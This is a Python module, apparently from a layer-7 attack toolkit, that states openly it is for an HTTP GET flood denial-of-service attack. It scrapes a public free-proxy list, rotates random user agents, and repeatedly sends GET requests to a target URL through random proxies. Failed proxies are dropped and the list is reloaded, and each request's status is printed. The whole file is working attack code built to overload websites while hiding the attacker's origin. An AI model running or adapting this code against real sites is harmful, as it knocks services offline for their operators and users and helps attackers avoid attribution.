"""This module provides the flood function for an HTTP GET request DoS attack through proxies."""

import json
import random
import sys
import warnings
from typing import Dict, List

import requests
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout, ProxyError

# Ignore warnings for unverified HTTPS requests
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Load user agents from a JSON file
with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]

def get_http_proxies() -> List[Dict[str, str]]:
    """Return a list of available proxies using HTTP protocol.

    Returns:
        List[Dict[str, str]]: A list containing dictionaries with http and https proxies.
    """
    try:
        # Fetch proxy list from proxyscrape
        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text",
            verify=False,
        ) as proxy_list:
            # Ensure each proxy has schema for both HTTP and HTTPS
            proxies = [
                {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                for proxy in proxy_list.text.split("\r\n") if proxy
            ]
    except Timeout:
        print(f"\n{F.RED}[!] {F.CYAN}Could not connect to the proxy source!{F.RESET}")
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}[!] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

# Default headers for HTTP requests
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

# Load initial proxy list
proxies = get_http_proxies()
# Color code for status printing
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str) -> None:
    """Start an HTTP GET request flood through proxies.

    Args:
        target (str): Target URL to flood.

    Returns:
        None
    """
    global proxies
    global headers

    # Randomly choose a user-agent for each request
    headers["User-agent"] = random.choice(user_agents)

    try:
        # Select a random proxy from the list
        proxy = random.choice(proxies)
        # Send a GET request with selected proxy and headers
        response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
    except (Timeout, OSError, ProxyError, requests.exceptions.ProxySchemeUnknown):
        # Remove invalid proxy from the list
        try:
            proxies.remove(proxy)
        except ValueError:
            # If no proxies remain, reload the proxy list
            proxies = get_http_proxies()
    else:
        # Print request status and data if request is successful
        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        proxy_addr = f"| {F.RESET}Proxy: {F.CYAN}{proxy['http']:>21}"
        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")

        # Reload proxy list if needed
        if not response.status_code:
            try:
                proxies.remove(proxy)
            except ValueError:
                proxies = get_http_proxies()
